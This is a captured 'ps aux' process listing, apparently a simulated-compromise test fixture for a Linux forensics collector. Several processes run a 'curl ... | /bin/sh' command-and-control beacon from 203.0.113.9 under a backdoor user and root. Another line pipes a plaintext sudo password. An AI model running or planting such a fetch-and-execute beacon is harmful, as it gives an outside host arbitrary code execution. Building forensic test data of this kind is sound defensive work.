@@ -1,0 +1,46 @@
+# captured_utc: 2026-11-10T17:15:11Z
+# command: ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  7.0  0.1  24112 13788 ?        Ss   22:14   0:01 /sbin/init
+root           2  0.0  0.0   3120  2048 ?        Sl   22:14   0:00 /init
+root           8  0.0  0.0   3120  1792 ?        Sl   22:14   0:00 plan9 --control-socket 7 --log-level 4 --server-fd 8 --pipe-fd 10 --log-truncate
+root          49  2.9  0.1  42056 14976 ?        Ss   22:14   0:00 /usr/lib/systemd/systemd-journald
+root          64  3.4  0.1  34716 11136 ?        Ss   22:14   0:00 /usr/lib/systemd/systemd-udevd
+root         164  0.1  0.0   4288  2432 ?        Ss   22:14   0:00 /usr/sbin/cron -f
+message+     170  0.2  0.0   8040  3456 ?        Ss   22:14   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root         190  1.0  0.1  17976  8320 ?        Ss   22:14   0:00 /usr/lib/systemd/systemd-logind
+root         204  0.1  0.0   5332  2560 hvc0     Ss+  22:14   0:00 /usr/sbin/agetty --noreset --noclear --issue-file=/etc/issue:/etc/issue.d:/run/issue.d:/usr/lib/issue.d --keep-baud 115200,57600,38400,9600 - vt220
+root         206  0.0  0.0   5288  2432 tty1     Ss+  22:14   0:00 /usr/sbin/agetty --noreset --noclear --issue-file=/etc/issue:/etc/issue.d:/run/issue.d:/usr/lib/issue.d - linux
+root         306  0.0  0.0   7628  4224 ?        Ss   22:14   0:00 login -- kali
+kali         316  2.6  0.1  22224 12416 ?        Ss   22:14   0:00 /usr/lib/systemd/systemd --user
+kali         318  0.0  0.0  22304  3660 ?        S    22:14   0:00 (sd-pam)
+kali         338  0.2  0.0   5292  4352 pts/1    Ss+  22:14   0:00 -bash
+root         523  0.3  0.0   7712  3072 ?        S    22:15   0:00 /usr/sbin/CRON -f
+root         524  0.1  0.0   7716  3200 ?        S    22:15   0:00 /usr/sbin/CRON -f
+root         525  0.1  0.0   7716  3200 ?        S    22:15   0:00 /usr/sbin/CRON -f
+root         526  0.2  0.0   7716  3328 ?        S    22:15   0:00 /usr/sbin/CRON -f
+backdoo+     533  0.1  0.0   3576  2048 ?        Ss   22:15   0:00 /bin/sh -c curl -s http://203.0.113.9/beacon | /bin/sh # C2 Beacon
+backdoo+     534  0.5  0.0   3576  1920 ?        Ss   22:15   0:00 /bin/sh -c curl -s http://203.0.113.9/beacon | /bin/sh # C2 Beacon
+backdoo+     535  0.3  0.0   3576  1920 ?        Ss   22:15   0:00 /bin/sh -c curl -s http://203.0.113.9/beacon | /bin/sh # C2 Beacon
+root         536  0.3  0.0   3576  1792 ?        Ss   22:15   0:00 /bin/sh -c curl -s http://203.0.113.9/beacon | sh
+backdoo+     537  0.4  0.1  25012 12544 ?        S    22:15   0:00 curl -s http://203.0.113.9/beacon
+backdoo+     539  0.1  0.0   3576  1920 ?        S    22:15   0:00 /bin/sh
+backdoo+     540  0.3  0.1  25012 12544 ?        S    22:15   0:00 curl -s http://203.0.113.9/beacon
+backdoo+     541  0.3  0.1  25012 12416 ?        S    22:15   0:00 curl -s http://203.0.113.9/beacon
+backdoo+     542  0.0  0.0   3576  1920 ?        S    22:15   0:00 /bin/sh
+root         543  0.2  0.1  25012 12544 ?        S    22:15   0:00 curl -s http://203.0.113.9/beacon
+root         544  0.0  0.0   3576  1792 ?        S    22:15   0:00 sh
+backdoo+     545  0.0  0.0   3576  1792 ?        S    22:15   0:00 /bin/sh
+root         606  0.0  0.0   3136   904 ?        Ss   22:15   0:00 /init
+root         607  0.0  0.0   3136  1040 ?        S    22:15   0:00 /init
+kali         608  5.6  0.0   8024  3584 pts/0    Ss+  22:15   0:00 bash -c cd /mnt/d/C/Git/Linux-Forensics-system && echo kali | sudo -S sh collector/collect.sh -r / -o /mnt/d/C/Git/Linux-Forensics-system/cases/wsl_enterprise -c CASE-ENTERPRISE-SIM -p Fahad -V -z
+root         609  0.0  0.0  34720  6584 ?        S    22:15   0:00 (udev-worker)
+root         610  0.0  0.0  34720  6584 ?        S    22:15   0:00 (udev-worker)
+root         611  0.0  0.0  34720  6584 ?        S    22:15   0:00 (udev-worker)
+root         612  0.0  0.0  34720  6584 ?        S    22:15   0:00 (udev-worker)
+root         613  0.0  0.0  34720  6584 ?        S    22:15   0:00 (udev-worker)
+root         614  1.4  0.0  34720  6584 ?        S    22:15   0:00 (udev-worker)
+root         616  3.1  0.0  19656  7168 pts/0    S+   22:15   0:00 sudo -S sh collector/collect.sh -r / -o /mnt/d/C/Git/Linux-Forensics-system/cases/wsl_enterprise -c CASE-ENTERPRISE-SIM -p Fahad -V -z
+root         620  0.0  0.0  19656  2292 pts/2    Ss+  22:15   0:00 sudo -S sh collector/collect.sh -r / -o /mnt/d/C/Git/Linux-Forensics-system/cases/wsl_enterprise -c CASE-ENTERPRISE-SIM -p Fahad -V -z
+root         621  7.1  0.0   3576  2048 pts/2    S    22:15   0:00 sh collector/collect.sh -r / -o /mnt/d/C/Git/Linux-Forensics-system/cases/wsl_enterprise -c CASE-ENTERPRISE-SIM -p Fahad -V -z
+root         636  300  0.0  10396  4224 pts/2    R    22:15   0:00 ps aux
